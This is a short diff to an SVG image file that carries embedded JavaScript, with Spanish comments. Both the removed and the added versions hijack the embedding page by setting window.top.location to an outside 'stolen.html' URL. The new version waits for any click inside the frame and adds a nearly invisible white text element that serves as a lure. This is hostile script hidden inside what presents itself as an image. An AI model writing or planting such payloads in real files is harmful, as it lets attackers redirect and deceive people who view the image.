@@ -1,6 +1,16 @@
 <svg xmlns="http://www.w3.org/2000/svg">
 <script type="text/javascript">
-  // Redirigís toda la página a tu dominio
-  window.top.location = 'https://poggiecar.github.io/CDN/stolen.html';
+  // Esperar click en cualquier parte del iframe
+  document.addEventListener('click', function() {
+    window.top.location = 'https://poggiecar.github.io/CDN/stolen.html';
+  });
+  
+  // O con un botón visible
+  var btn = document.createElementNS('http://www.w3.org/2000/svg', 'text');
+  btn.setAttribute('x', '10');
+  btn.setAttribute('y', '20');
+  btn.setAttribute('fill', 'white');
+  btn.textContent = '.';
+  document.querySelector('svg').appendChild(btn);
 </script>
 </svg>
